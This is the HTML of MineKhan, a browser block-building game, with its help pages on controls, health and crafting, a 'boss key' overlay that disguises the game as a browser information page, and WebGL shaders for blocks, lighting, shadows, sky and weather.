	<!--<div style="z-index:4;position:absolute;top:0;left:0;width:100vw;height:100vh;background:white;">
		<div id="countdown" style="font-size:24px;position:absolute;top:50%;left:50%;transform:translateX(-50%) translateY(-50%);"></div>
		<button id="hideCountdown" style="margin:8px;">Hide and possibly get MineKhan blocked</button>
	</div>-->
	<!--<div id="loginContainer" class="hidden" style="position:absolute;background:white;z-index:10;width:50vw;height:50vh;top:25vh;left:25vw;overflow:auto;padding:16px;box-sizing:border-box;">
		<h1>Login hosted by thingmaker.</h1>
		<p>It is recommended to login <a href="/login">here</a> if you are on thingmaker's website. Logging in with this will keep you logged in for some time.</p>
		<p>If you want to register, put username and password and click register, else if you want to login to account, put username and password and click login.</p>
		<input placeholder="username" type="username"></input><br>
		<input placeholder="password" type="password"></input><br>
		<button>login</button><br>
		<button>register</button><br>
		<button>cancel</button><br>
		<script>
			function login(){
				let loginContainer = document.querySelector("#loginContainer")
				loginContainer.classList.remove("hidden")
				let ins = loginContainer.getElementsByTagName("input")
				let btns = loginContainer.getElementsByTagName("button")
				return new Promise((resolve,reject) => {
					function whenDone(){
						loginContainer.classList.add("hidden")
						btns[0].onclick = btns[1].onclick = btns[2].onclick = null
						ins[0].value = ins[1].value = ""
						resolve(...arguments)
					}
					btns[0].onclick = function(){
						loginContainer.classList.add("hidden")
						fetch("/server/login",{method:"POST",body:JSON.stringify({username:ins[0].value,password:ins[1].value})}).then(r=>r.json()).then(r => {
							if(r.success){
								whenDone(r)
							}else{
								loginContainer.classList.remove("hidden")
								alert(r.message)
							}
						})
					}
					btns[1].onclick = function(){
						loginContainer.classList.add("hidden")
						fetch("/server/register",{method:"POST",body:JSON.stringify({username:ins[0].value,password:ins[1].value})}).then(r=>r.json()).then(r => {
							if(r.success){
								whenDone(r)
							}else{
								loginContainer.classList.remove("hidden")
								alert(r.message)
							}
						})
					}
					btns[2].onclick = function(){
						whenDone()
					}
				})
			}
		</script>
	</div>-->
  <div id="help" class="hidden">
    <div class="nav">
      <a onclick="scrollToEl('help_about')">About</a>
      <a onclick="scrollToEl('help_controls')">Controls</a>
      <a onclick="scrollToEl('help_health')">Health</a>
      <a onclick="scrollToEl('help_inventory')">Inventory</a>
      <a onclick="scrollToEl('help_crafting')">Crafting</a>
      <a onclick="scrollToEl('help_wiki')">MineKhan Wiki</a>
    </div>
    <div class="content">
      <div id="help_about">
        <h1>About MineKhan</h1>
				In this game/simulation, you can do survival mode which is managing resources, or you can do creative mode which is building things like houses or circuits. There are hundreds of different blocks for building with different colors and patterns.
				<br>
        <!--MineKhan is a sandbox game.<br>
        MineKhan has things Minecraft doesn't.<br>
        MineKhan doesn't have some things Minecraft has.<br>-->
        If you want to suggest stuff, you should go to the website that this is on: <a href="/posts" target="_blank">here</a>
        <h2>Where MineKhan came from</h2>
        One upon a time, there was a game on Khan Academy called Scuscraft.<br>
        One day, Willard spin-offed Scusraft and made MineKhan.<br>
        After many days, he ported it from a pjs program to to a webpage.<br>
        Then, when Willard made his own website (willard.fun), thingMaker copied the code and programmed it more so soon it became this.<br>
        The End.
				<br><br>
				<span id="credits"></span>
      </div>
			<div>
				<h1>URL parameters</h1>
<pre>
target=id - Join a server when loading is finished
Example: /minekhan?target=ew2nm43qjxz66hb4kwe5

nosound
Example: /minekhan?nosound
</pre>
			</div>
      <div id="help_controls">
        <h1>Controls</h1>
        <b>These controls are used only when playing in a world.</b> You can change them by going to options and clicking change controls<br>
<pre>With keyboard and mouse:
* Right-click (or ctrl + left-click): place block
* Left-click: Remove block
* Middle-click: Pick block
* In survival mode, hold down left-click or repeatedly left-click: Break block
* Q: Sprint
* Shift: Sneak and stop sitting
* W: Walk forward
* S: Walk backward
* A: Walk left
* D: Walk right
* E: Open inventory
* B: Toggle super Breaker
* Z: Zoom
* L: Toggle Spectator mode
* Enter: Toggle slab/stair mode
* Arrow Keys: look around
* P or Esc: pause/unpause
* 1-9 navigate hotbar
* Spacebar: jump
* Double jump: toggle flight
* Shift (flying): fly down
* Space (flying): fly up
* T: Open chat
* ; (semicolon): Release the pointer without pausing (for screenshots)
* Backspace or delete: drops the item you're holding right now
* /: Type command
* H: Hyper builder
* O: Toggle third person mode
* U: Toggle sitting

With keyboard and touchpad:
* Click-with-two-fingers (or ctrl + click-with-one-finger): place block
* Click-with-one-finger: Remove block
* Click-with-three-fingers: Pick block
* In survival mode, hold down one finger or repeatedly click-with-one-finger: Break block
* Other controls are same as controls for keyboard and mouse

With touch screen:
* Tap: Place block / Attack
* Press and hold: Break block / Use
* Swipe: Look around (can be changed with mouse sensitivity)
* Tap hotbar: Select slot
* Press and hold hotbar: Drop item in slot
* Buttons with arrows / joystick: Move around
* There are also other controls that are self explanatory
</pre><br><br>
        Can't remember WASD keys?<br>Think of them as this:
        <table class="tableBright">
          <tr>
            <td></td>
            <td>W: </td>
            <td></td>
          </tr>
          <tr>
            <td>A: </td>
            <td>S: </td>
            <td>D: </td>
          </tr>
        </table>
      </div>
      <div id="help_health">
        <h1>Health</h1>
        Health is a feature only in survival.<br>
        A heart looks like this: <div img="heart"></div><br>
        A half heart looks like this: <div img="halfHeart"></div><br>
        When you create a new world, you start with 20 <div img="heart" amount="10"></div> health.<br>
        When you have 0 <div img="deadHeart" amount="10"></div> health, you die.
        <h2>Losing health</h2>
        There are many ways to lose health inluding fall damage, being attacked by other players, and touching cactus and lava.
        <h2>Effects</h2>
        There are effects that change how the hearts look.<br>
        When you are withered, it looks like this: <img src="assets/images/witherHealthBar.gif"><br>
        When you are freezing, it looks like this: <img src="assets/images/freezeHealthBar.gif">
      </div>
      <div id="help_inventory">
        <h1>Inventory</h1>
        When playing a world, press e to open the inventory.<br><br>
        <h2>Creative inventory</h2>
        <img src="assets/images/help/inventory.png" style="border:1px solid white;"><br>
        <h2>Survival inventory</h2>
        <img src="assets/images/help/survival_inventory.png" style="border:1px solid white;"><br>
        More info will <s style="color:red;">come soon</s> not come anytime soon.
      </div>
      <div id="help_crafting">
        <h1>Crafting</h1>
        You can access the crafting grid from the inventory or by right clicking a crafting table.<br>
        The inventory crafting grid is 2&times;2.<br>
        The crafting table's crafting grid is 3&times;3.<br>
        Some things require a crafting table to be crafted.<br><br>
        <h2>Recipes</h2>
        Click the collapsible to see crafting recipes
        <div class="collapsible" title="Recipes" id="recipes">
          oh wait, it's kinda hard to show the recipes 'cause i don't have images
        </div>
        Crafting recipe types:<br>
        Fixed: You have to put the items in the grid the exact way.<br>
        Shaped: The ingredients have a certain shape and the shape can be moved around.<br>
        Shapeless: The ingredients can be arranged on the grid in any way
      </div>
      <div id="help_wiki">
				<h1>MineKhan Wiki</h1>
				The MineKhan Wiki contains more information. Click <a href="/minekhan-website/wiki" target="_blank">here</a> to open it.
			</div>
    </div>
  </div>
	<style>
		html.hide body > *:not(#hider){
			filter:saturate(0.25);
		}
		#hider{display:none;}
		html.hide #hider{
			padding:8px;
			z-index:9;
			position:absolute;
    	display: block;
			width:100%;
			height:100%;
			top:0;
			left:0;
			background: radial-gradient(ellipse at center, rgba(255,255,255,0.65) 0%,rgba(255,255,255,0.7) 70%,rgba(255,255,255,1) 100%);
			pointer-events: none;
			font-size:24px;
			overflow-y:auto;
		}
		#hider button, #hider input{
			all:revert;
		}
	</style>
	<div id="hider">
		<h1>Web Browser Information</h1>
		<p>You are using a web browser. It is very useful as it can be used to view this web browser information displayer.</p>
		<p>It supports things like:</p>
		text<br>
		<button>buttons</button><br>
		<input value="inputs"><br>
		checkboxes: <input type="checkbox"><br>
		dropdown menus: <select><option>a</option><option>b</option><option>c</option><option>d</option></select><br>
		<b style="color:red;background:yellow;">colors</b><br>
		<p>You are totally not playing video games with your web browser, really, you are studying it which is very eductional!</p>
		Press Ctrl+K to use custom page for hider.
		<p>Aliquam mauris metus, tempus vel auctor nec, malesuada vitae turpis. Donec quam tortor, molestie non placerat vitae, placerat sed lacus. Proin porttitor rutrum ultricies. Vestibulum porttitor, lectus sed tempus scelerisque, magna sem bibendum nunc, at dapibus felis dui in lectus. Aenean pretium feugiat ex, a vestibulum dui convallis ac. Aliquam placerat eu lectus vel lobortis. Pellentesque ut urna eleifend, sodales magna eget, ultrices dui. Nulla feugiat lectus vel justo lobortis finibus. Aliquam scelerisque porttitor metus eget elementum. Pellentesque vel fringilla justo. Pellentesque convallis sodales egestas. Donec erat ante, dapibus quis arcu eu, luctus ullamcorper lacus. Donec dignissim, dolor ac lacinia luctus, metus est cursus sem, nec varius eros tellus ut felis.</p>
		<p>Suspendisse rhoncus, mi a consequat egestas, metus augue cursus turpis, in dapibus tortor leo ac elit. Curabitur venenatis id urna nec dapibus. Donec dapibus suscipit nibh, quis fringilla lectus porta vel. Ut venenatis ut felis in consectetur. Vivamus suscipit vestibulum tincidunt. Suspendisse laoreet dui vitae sollicitudin feugiat. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Proin nec bibendum urna. Integer euismod mollis viverra. Nam tristique imperdiet sem ut condimentum. Donec quis sollicitudin justo, in pretium enim. Aliquam erat volutpat.</p>
		<iframe style="position:absolute;top:0;left:0;width:100vw;height:100vh;border:none;"></iframe>
		<script>
			addEventListener("keydown",function(e){
				if(e.ctrlKey){
					if(e.key === "h"){
						e.preventDefault()
						//fetch("https://baconipsum.com/api/?type=meat-and-filler&format=html").then(r => r.text()).then(r => document.querySelector("#loremIpsum").innerHTML = r).catch(console.error)
						document.title = "Web Browser Information"
						try{
							history.replaceState(null, "", "/browserinfo")
						}catch(e){console.error(e)}
						document.querySelector("#icon").href = "https://upload.wikimedia.org/wikipedia/commons/d/d9/Icon-round-Question_mark.svg"
						//images.minekhan.src = "https://upload.wikimedia.org/wikipedia/commons/a/a3/Schoology_Logo.svg"
						document.documentElement.classList.add('hide')
						let frame = document.querySelector("#hider iframe")
						if(settings.hideurl){
							frame.style.display = "block"
							frame.src = settings.hideurl
						}else frame.style.display = "none"
					}else if(e.key === "j"){
						e.preventDefault()
						let frame = document.querySelector("#hider iframe")
						if(frame.style.display === "block"){
							frame.style.display = "none"
						}else document.documentElement.classList.remove('hide')
					}else if(e.key === "k"){
						e.preventDefault()
						settings.hideurl = prompt("URL of page to hide behind:")
						saveSettings()
					}
				}
			})
		</script>
	</div>
  
	<script>
		// Code edits will erase the world.
		// Place save code here to load your world. Make extra sure you got it copied so you don't paste in the wrong thing and delete your world on accident lol
		var loadString = ""
	</script>
  <!--url for parkour map: https://www.khanacademy.org/cs/i/4676725830008832-->
 	<script type="x-shader/vertex" id="blockVertexShader">
		attribute vec3  aVertex;
		attribute vec2  aTexture;
		attribute vec3 aNormal;
		attribute float aShadow;
		attribute float aSkylight;
		attribute float aBlocklight;
    attribute vec3 aTint;
		varying vec2  vTexture;
		varying float vShadow;
    varying vec3 vTint;
    varying vec3 vVertex;
		varying vec3 vNormal;
		uniform mat4 uView;
		uniform float uDist;
		uniform vec3 uPos;
    uniform vec3 skyColor;
    uniform bool isInWorld;
		uniform float uGameTime;

		#minekhan_import fog
		#minekhan_import lighting

		void main() {
			vTexture = aTexture;
      if(isInWorld){
				#ifdef GRAPHICS_MORE_REAL
					doShadowMap(aVertex);
					vShadow = abs(aShadow) * setLight(aSkylight,aBlocklight);
				#else
					float normalLight = aShadow == -1. ? 1. : dot(aNormal*aNormal, vec3(0.8, -aNormal.y < 0. ? 0.75 : 1., 0.95));
					vShadow = abs(aShadow) * setLight(aSkylight,aBlocklight) * normalLight;
					//abs(shadow) is useful when shadow is -1
				#endif
			}else{
				lightTint = vec3(1.,1.,1.);
				vShadow = aShadow;
			}
      vTint = aTint;
      vVertex = aVertex;
			vNormal = aNormal;
			gl_Position = uView * vec4(aVertex, 1.0);

			setFog();
		}
	</script>
	<script type="x-shader/fragment" id="blockFragmentShader">
		#ifdef GL_FRAGMENT_PRECISION_HIGH
			precision highp float;
		#else
			precision mediump float;
		#endif

		uniform sampler2D uSampler;
    uniform sampler2D endPortalSampler;
    uniform bool uTrans;
    uniform vec3 skyColor;
		uniform vec3 uPos;
    uniform float uGameTime;
    uniform float brightness;
    uniform bool isInWorld;
		varying float vShadow;
		varying vec2 vTexture;
    varying vec3 lightTint;
    varying vec3 vTint;
    varying vec3 vVertex;
		varying vec3 vNormal;

		#minekhan_import fog
		#minekhan_import lighting

    const float PI = radians(180.);
    vec2 endPortalLayer(int i){
      float rot = float(i) / 16. * PI * 5.;
      float s = sin(rot);
      float c = cos(rot);
      vec2 pos = vec2(vVertex.x - uPos.x, vVertex.z - uPos.z);
      pos = vec2((pos.x*c)+(pos.y*-s), (pos.x*s)+(pos.y*c));
      pos = pos / float(i) * 2.;
      pos.y += uGameTime / 200.;
      return pos;
    }
    void endPortal(){
      vec3 color = vec3(0.,0.,0.);
      color += texture2D(endPortalSampler, endPortalLayer(1)).rgb * vec3(0.022087, 0.098399, 0.110818);
      color += texture2D(endPortalSampler, endPortalLayer(2)).rgb * vec3(0.011892, 0.095924, 0.089485);
      color += texture2D(endPortalSampler, endPortalLayer(3)).rgb * vec3(0.027636, 0.101689, 0.100326);
      color += texture2D(endPortalSampler, endPortalLayer(4)).rgb * vec3(0.046564, 0.109883, 0.114838);
      color += texture2D(endPortalSampler, endPortalLayer(5)).rgb * vec3(0.064901, 0.117696, 0.097189);
      color += texture2D(endPortalSampler, endPortalLayer(6)).rgb * vec3(0.063761, 0.086895, 0.123646);
      color += texture2D(endPortalSampler, endPortalLayer(7)).rgb * vec3(0.084817, 0.111994, 0.166380);
      color += texture2D(endPortalSampler, endPortalLayer(8)).rgb * vec3(0.097489, 0.154120, 0.091064);
      color += texture2D(endPortalSampler, endPortalLayer(9)).rgb * vec3(0.106152, 0.131144, 0.195191);
      color += texture2D(endPortalSampler, endPortalLayer(10)).rgb * vec3(0.097721, 0.110188, 0.187229);
      color += texture2D(endPortalSampler, endPortalLayer(11)).rgb * vec3(0.133516, 0.138278, 0.148582);
      color += texture2D(endPortalSampler, endPortalLayer(12)).rgb * vec3(0.070006, 0.243332, 0.235792);
      color += texture2D(endPortalSampler, endPortalLayer(13)).rgb * vec3(0.196766, 0.142899, 0.214696);
      color += texture2D(endPortalSampler, endPortalLayer(14)).rgb * vec3(0.047281, 0.315338, 0.321970);
      color += texture2D(endPortalSampler, endPortalLayer(15)).rgb * vec3(0.204675, 0.390010, 0.302066);
      color += texture2D(endPortalSampler, endPortalLayer(16)).rgb * vec3(0.080955, 0.314821, 0.661491);
      gl_FragColor = vec4(color,1.);
    }
    
    void main(){
      if(vTexture.x == -1.){
        endPortal();
      }else{
        vec4 color = texture2D(uSampler, vTexture);
				vec3 tint = vTint;
				if(color.r != color.g || color.g != color.b){
					tint.r = 1.;
					tint.g = 1.;
					tint.b = 1.;
				}
				tint *= lightTint;
				float shadow = vShadow;
				#ifdef GRAPHICS_MORE_REAL
					if(isInWorld){
						shadow = getShadowMap(vShadow,vNormal,tint);
					}
				#endif
				color = fog(vec4(color.rgb * tint * shadow*brightness, color.a));
				gl_FragColor = color;
				if (gl_FragColor.a == 0.0) discard;
				else if (!uTrans && gl_FragColor.a != 1.0) discard;
				else if (uTrans && gl_FragColor.a == 1.0) discard;
      }
    }
	</script>
	<script type="x-shader/vertex" id="shadowMapVertexShader">
		attribute vec3 aVertex;
		attribute vec2 aTexture;
		uniform mat4 skylightView;
		varying vec2 vTexture;
		void main() {
			vTexture = aTexture;
			gl_Position = skylightView * vec4(aVertex, 1.0);
		}
	</script>
	<script type="x-shader/fragment" id="shadowMapFragmentShader">
		#ifdef GL_FRAGMENT_PRECISION_HIGH
			precision highp float;
		#else
			precision mediump float;
		#endif
		
		uniform sampler2D uSampler;
		varying vec2 vTexture;
		void main(){
			if (texture2D(uSampler, vTexture).a < 0.5) discard;
			gl_FragColor = vec4(gl_FragCoord.z,gl_FragCoord.z,gl_FragCoord.z,1.);
		} //vec4(texture2D(uSampler, vTexture).rgb*gl_FragCoord.z,1.);
	</script>
  <script type="x-shader/vertex" id="skyboxVertexShader">
    attribute vec3 aVertex;
    uniform mat4 uView;
    varying vec3 position;
    mat4 no_translate (mat4 mat) {
      mat4 nmat = mat;
      nmat[3].xyz = vec3(0.);
      return nmat;
    }
    void main(void) {
      position = aVertex;
      gl_Position = no_translate(uView) * vec4(aVertex * 100., 0.0);
    }
  </script>
  <script type="x-shader/fragment" id="skyboxFragmentShader">
    #ifdef GL_FRAGMENT_PRECISION_HIGH
      precision highp float;
    #else
      precision mediump float;
    #endif
    uniform float light;
    uniform vec3 sky;
    uniform vec3 skyBottom;
		uniform float uTime;
		uniform float brightness;
    varying vec3 position;
    
    float rand3D(in vec3 co){
      return fract(sin(dot(co.xyz ,vec3(12.9898,78.233,144.7272))) * 43758.5453);
    }
    vec3 round3(vec3 position){
			//what's a quaternion???
			float RotationAngle = uTime*3.141592653589793;
			vec4 q = vec4(
				sin(RotationAngle / 2.),
				sin(RotationAngle / 2.),
				sin(RotationAngle / 2.),
				cos(RotationAngle / 2.)
			);
			vec3 temp = cross(q.xyz, position) + q.w * position;
			position = position + 2.0*cross(q.xyz, temp);
			position = normalize(position);
      position.x = floor(position.x*400.)/400.;
      position.y = floor(position.y*400.)/400.;
      position.z = floor(position.z*400.)/400.;
      return position;
    }
    void main (void) {
      vec3 dir = normalize(position);
      float horizonal = min(dot(dir, vec3(0., -1., 0.))+1., 1.);
      vec3 nightSky = vec3(0.);
      if(light != 1.){
        float stars = rand3D(round3(position));
        if(stars > 0.999){
          nightSky = vec3(1.);
        }//else if(stars > 0.998){
          //nightSky = vec3(0.5);
        //}
      }
      gl_FragColor = vec4(mix(nightSky,mix(sky,skyBottom,horizonal),light)*brightness, 1.);
    }
  </script>
	<script type="x-shader/vertex" id="entityVertexShader">
		attribute vec3  aVertex;
		attribute vec2  aTexture;
		attribute vec3 aNormal;
		varying vec2  vTexture;
		varying float lightLevel;
		varying vec3 vNormal;
		uniform mat4 uView;
		uniform mat4 uModelMat;
    uniform vec3 skyColor;
    uniform float uBlockLight;
    uniform float uSkylight;
		uniform bool useNormals;
		uniform float uDist;
		uniform vec3 uPos;

    const float PI2 = radians(90.);
		/*float directionalLight(in float a, in float amount){
			//return a*amount;
			return (1.-cos(a*PI2))*amount;
		}*/
		#minekhan_import fog
		#minekhan_import lighting
		void main() {
			vTexture = aTexture;
			vNormal = normalize((uModelMat*vec4(aNormal,0.)).xyz);
			gl_Position = uView * vec4(aVertex, 1.0);

			if(useNormals){
				#ifdef GRAPHICS_MORE_REAL
					vec4 actualVertex = uModelMat*vec4(aVertex,1.);
					doShadowMap(actualVertex.xyz/actualVertex.w);
					lightLevel = setLight(uSkylight,uBlockLight);
				#else
					float normalLight = 1.;
					normalLight = dot(vNormal*vNormal, vec3(0.8, -vNormal.y < 0. ? 0.75 : 1., 0.95));
					lightLevel = normalLight * setLight(uSkylight,uBlockLight);
				#endif
			}else{
				lightLevel = setLight(uSkylight,uBlockLight);
			}
			setFog();
		}
	</script>
	<script type="x-shader/fragment" id="entityFragmentShader">
		#ifdef GL_FRAGMENT_PRECISION_HIGH
			precision highp float;
		#else
			precision mediump float;
		#endif

		uniform sampler2D uSampler;
    uniform float harmEffect;
    uniform vec3 tint;
    uniform bool tintGray;
    uniform int shader;
    uniform float brightness;
		uniform float uGameTime;
    uniform vec3 skyColor;
		uniform bool useNormals;
		varying float lightLevel;
		varying vec2 vTexture;
    varying vec3 lightTint;
		varying vec3 vNormal;

		#minekhan_import fog
		#minekhan_import lighting

		void main(){
			vec2 texture = vTexture;
			if(shader == 2){
				//repeating texture
				const float texAmountY = 256.;//amount of texture rows
				float texY = floor(texture.y*texAmountY)/texAmountY;
				float y = (texture.y - texY) * 255. * texAmountY * 4. + uGameTime*4.;//max height
				texture.y = texY + (y - floor(y))/texAmountY;
			}
			vec4 color = texture2D(uSampler, texture);
      if(!tintGray || (color.r == color.g && color.g == color.b)){
        color.rgb *= tint;
      }
      if(harmEffect > 0.0){
        color.rgb = mix(color.rgb, vec3(1.,0.,0.), .5);
      }
      if(shader == 1){
        color.rgb = mix(color.rgb, vec3(1.), 0.75);
      }
			float shadow = lightLevel;
			vec3 tint = lightTint;
			#ifdef GRAPHICS_MORE_REAL
				if(useNormals){
					shadow = getShadowMap(lightLevel,vNormal,tint);
				}
			#endif
			gl_FragColor = fog(vec4(color.rgb * tint * shadow*brightness, color.a));
      if (gl_FragColor.a == 0.0) discard;
		}
	</script>
  <script type="x-shader/vertex" id="particleVertexShader">
		attribute vec3  aVertex;
		attribute vec2  aTexture;
		varying vec2  vTexture;
		varying float lightLevel;
		uniform mat4 uView;
		uniform mat4 uModelMat;
    uniform vec3 skyColor;
    uniform float uBlockLight;
    uniform float uSkylight;
		uniform float uDist;
		uniform vec3 uPos;

		#minekhan_import fog
		#minekhan_import lighting

		void main() {
			vTexture = aTexture;
			gl_Position = uView * vec4(aVertex, 1.0);

			setFog();
      
			#ifdef GRAPHICS_MORE_REAL
				vec4 actualVertex = uModelMat*vec4(aVertex,1.);
				doShadowMap(actualVertex.xyz/actualVertex.w);
			#endif
      lightLevel = setLight(uSkylight,uBlockLight);
		}
	</script>
	<script type="x-shader/fragment" id="particleFragmentShader">
		#ifdef GL_FRAGMENT_PRECISION_HIGH
			precision highp float;
		#else
			precision mediump float;
		#endif

		uniform sampler2D uSampler;
		varying vec2 vTexture;
		varying float lightLevel;
    varying vec3 lightTint;
    uniform vec3 tint;
    uniform bool tintGray;
    uniform float brightness;
    uniform vec3 skyColor;

		#minekhan_import fog
		#minekhan_import lighting

		void main(){
			vec4 color = texture2D(uSampler, vTexture);
      vec3 currentTint = tint;
      if(tintGray && (color.r != color.g || color.g != color.b)){
        currentTint.r = currentTint.g = currentTint.b = 1.;
      }
			float shadow = lightLevel;
			vec3 tint = lightTint;
			#ifdef GRAPHICS_MORE_REAL
				shadow = getShadowMap(lightLevel,vec3(0,-1,0),tint);
			#endif
			gl_FragColor = fog(vec4(color.rgb * currentTint * tint * shadow*brightness, color.a));
      if (gl_FragColor.a == 0.0) discard;
		}
	</script>
	<script type="x-shader/vertex" id="fogVertex">
		varying float vFog;
    varying float waterFog;
		void setFog(){
			float range = max(uDist / 5.0, 8.0);
			vFog = clamp((length(uPos - aVertex) - uDist + range) / range, 0.0, 1.0);
			waterFog = clamp(gl_Position.z / 150.0, 0.0, 1.0);
		}
	</script>
	<script type="x-shader/fragment" id="fogFragment">
		varying float vFog;
    varying float waterFog;
		uniform float fogTime;
    uniform int inLiquid;
		vec4 fog(vec4 color){
			color.rgb = mix(color.rgb, skyColor * fogTime*brightness, vFog);
			if (inLiquid == 1) color = vec4(mix(color.rgb, skyColor*brightness, waterFog), color.a);
			if (inLiquid == 2 || inLiquid == 3) color = vec4(mix(color.rgb, skyColor*brightness, min(waterFog*8., 1.)), color.a);
			return color;
		}
	</script>
	<script type="x-shader/vertex" id="lightingVertex">
		#ifdef GRAPHICS_MORE_REAL
			varying float vBlockLight;
			varying float vSkyLight;
		#endif
		const int skylightCascades = 3;
		varying vec3 lightTint;
    uniform bool flicker;
    uniform float uTime;
		uniform float uLantern;
		uniform int lightMethod;
		// If you are going to change this final lightlevel calculation
		// you have to change line 4487 as well since it calculates lightlevel of entity based on this
		float setLight(in float skyLight, in float blockLight){
			blockLight = max(blockLight, uLantern - length(uPos - aVertex) / 15.0);
			float pskyLight = skyLight;
			skyLight = max(skyLight-(1.-uTime),0.);
			#ifdef GRAPHICS_MORE_REAL
				vBlockLight = blockLight;
				vSkyLight = pskyLight;
				skyLight *= 0.82;
				blockLight = blockLight*blockLight*1.5;
			#endif
			float light = max(lightMethod == 2 ? 0. : skyLight, blockLight);
			if(lightMethod == 1 || lightMethod == 2){
				light = light*0.5+0.5;
			}
			if(lightMethod == -1){
				light = 0.75+light*0.25;
			}
			lightTint = vec3(1.,1.,1.);
			#ifndef GRAPHICS_MORE_REAL
				vec3 blockLightColor = flicker ? vec3(1.2,1,0.4) : vec3(1.2,0.975,0.375);
				float blight = max(blockLight - skyLight, 0.0);
				lightTint = mix(lightTint, skyColor, pskyLight * (1.0 - uTime) * 0.75);
				lightTint = mix(lightTint, blockLightColor, 1.0-(abs(0.5 - blight) * 2.0));
			#endif
			return light;
		}
		#ifdef GRAPHICS_MORE_REAL
			varying vec3 shadowMapTexture[skylightCascades];
			uniform mat4 skylightView[skylightCascades];
			void doShadowMap(in vec3 vertex){
				vec4 loc = skylightView[0] * vec4(vertex, 1.0);
				shadowMapTexture[0] = loc.xyz*0.5+0.5;
				loc = skylightView[1] * vec4(vertex, 1.0);
				shadowMapTexture[1] = loc.xyz*0.5+0.5;
				loc = skylightView[2] * vec4(vertex, 1.0);
				shadowMapTexture[2] = loc.xyz*0.5+0.5;
			}
		#endif
	</script>
	<script type="x-shader/fragment" id="lightingFragment">
		#ifdef GRAPHICS_MORE_REAL
			const int skylightCascades = 3;
			varying vec3 shadowMapTexture[skylightCascades];
			varying float vBlockLight;
			varying float vSkyLight;
			uniform sampler2D shadowMapSamplers[skylightCascades];
			uniform vec3 skylightDir;
			uniform float skylightAmount;
			uniform float skyOrange;
			uniform float uTime;
			uniform bool flicker;
			float getShadowMap(float light, vec3 normal, inout vec3 lightTint){
				if(light == 0.) return 0.;//there can't possibly be light in this case
				float skylight = uTime*1.5;
				//change below depending on skylightCascades
				bool shadow = false;
				if(shadowMapTexture[0].x > 0. && shadowMapTexture[0].x < 1. && shadowMapTexture[0].y > 0. && shadowMapTexture[0].y < 1.){
					float bias = 0.0001;
					shadow = shadowMapTexture[0].z-bias > texture2D(shadowMapSamplers[0], shadowMapTexture[0].xy).r;
				}else if(shadowMapTexture[1].x > 0. && shadowMapTexture[1].x < 1. && shadowMapTexture[1].y > 0. && shadowMapTexture[1].y < 1.){
					float bias = 0.00015;
					shadow = shadowMapTexture[1].z-bias > texture2D(shadowMapSamplers[1], shadowMapTexture[1].xy).r;
				}else if(shadowMapTexture[2].x > 0. && shadowMapTexture[2].x < 1. && shadowMapTexture[2].y > 0. && shadowMapTexture[2].y < 1.){
					float bias = 0.0002;
					shadow = shadowMapTexture[2].z-bias > texture2D(shadowMapSamplers[2], shadowMapTexture[2].xy).r;
				}
				float normalDot = max(dot(skylightDir,normal),0.);
				float adjSkyLight = max(vSkyLight-(1.-uTime),0.);
				float blight = max(vBlockLight - adjSkyLight, 0.0);
				lightTint *= mix(vec3(1.), vec3(0.8,1,1.3), max(vSkyLight * (1.0 - uTime), (shadow?skylightAmount:(1.-normalDot))*0.35));
				lightTint *= mix(flicker ? vec3(1.2,1,0.4) : vec3(1.2,0.975,0.375), vec3(1.), (abs(0.5 - blight) * 2.0));
				lightTint *= mix(vec3(1.), vec3(1.6,1.2,0.8), skyOrange*(shadow?0.:normalDot)*skylightAmount);
//reflect(lightDir,normal)
				return shadow || skylight<light ? light : mix(light,skylight, normalDot*skylightAmount);
			}
		#endif
	</script>
  <script type="x-shader/vertex" id="textVertexShader">
		attribute vec2 aVertex;
		attribute vec2 aTexture;
    attribute vec3 aTextColor;
    attribute float aColorSet;
		varying vec2 vTexture;
    varying vec3 vTextColor;
		varying float light;
		uniform mat4 uView;
    uniform vec3 textColor;
		uniform float brightness;
		uniform float uLantern;
		uniform float uLightLevel;

		void main() {
			vTexture = aTexture;
      if(aColorSet == 1.){
        vTextColor = aTextColor;
      }else{
        vTextColor = textColor;
      }
			light = max(uLightLevel*brightness, uLantern);
			gl_Position = uView * vec4(aVertex, 0.0, 1.0);
		}
	</script>
	<script type="x-shader/fragment" id="textFragmentShader">
		#ifdef GL_FRAGMENT_PRECISION_HIGH
			precision highp float;
		#else
			precision mediump float;
		#endif

		uniform sampler2D uSampler;
    uniform vec4 background;
    uniform bool glow;
		varying vec2 vTexture;
    varying vec3 vTextColor;
		varying float light;
    const float pixSize = 1./256.;

		void main(){
			vec4 color = texture2D(uSampler, vTexture);
      /*if(glow && color.a == 0.){
        float up = texture2D(uSampler, vec2(vTexture.x,vTexture.y+pixSize)).a;
        float down = texture2D(uSampler, vec2(vTexture.x,vTexture.y-pixSize)).a;
        float left = texture2D(uSampler, vec2(vTexture.x-pixSize,vTexture.y)).a;
        float right = texture2D(uSampler, vec2(vTexture.x+pixSize,vTexture.y)).a;
        if(up != 0. || down != 0. || left != 0. || right != 0.){
          color = vec4(vTextColor*0.75, 1.);
        }
      }*/
			gl_FragColor = vec4(mix(background.rgb, color.rgb*vTextColor, color.a) * light, mix(background.a, 1., color.a));
      if (gl_FragColor.a == 0.0) discard;
		}
	</script>
	<script type="x-shader/vertex" id="weatherVertexShader">
		attribute vec3 aVertex;
		attribute vec2 aTexture;
		attribute float type;
		varying vec2 vTexture;
		varying vec3 vVertex;
		uniform mat4 uView;
		uniform float uGameTime;

		void main() {
			vTexture = aTexture;
			if(type == 1.){
				vTexture.y -= uGameTime/4.;
			}else{
				vTexture.y -= uGameTime;
			}
			gl_Position = uView * vec4(aVertex, 1.0);
			vVertex = aVertex;
		}
	</script>
	<script type="x-shader/fragment" id="weatherFragmentShader">
		#ifdef GL_FRAGMENT_PRECISION_HIGH
			precision highp float;
		#else
			precision mediump float;
		#endif

		uniform sampler2D uSampler;
		uniform float uLightLevel;
		uniform float uAmount;
		uniform float brightness;
		uniform float uDist;
		uniform vec3 uPos;
		varying vec2 vTexture;
		varying vec3 vVertex;

		void main(){
			if(length(uPos-vVertex) > uDist) discard;
			vec4 color = texture2D(uSampler, vTexture);
			color = vec4(color.rgb * uLightLevel*brightness, color.a * uAmount);
			gl_FragColor = color;
      if (gl_FragColor.a == 0.0) discard;
		}
	</script>
	<script type="x-shader/vertex" id="2dVertexShader">
		attribute vec2 aVertex;
		attribute vec2 aTexture;
		attribute float aShadow;
		varying vec2 vTexture;
		varying float vShadow;

		void main() {
			vTexture = aTexture;
			vShadow = aShadow;
			gl_Position = vec4(aVertex, 0.5, 1.0);
		}
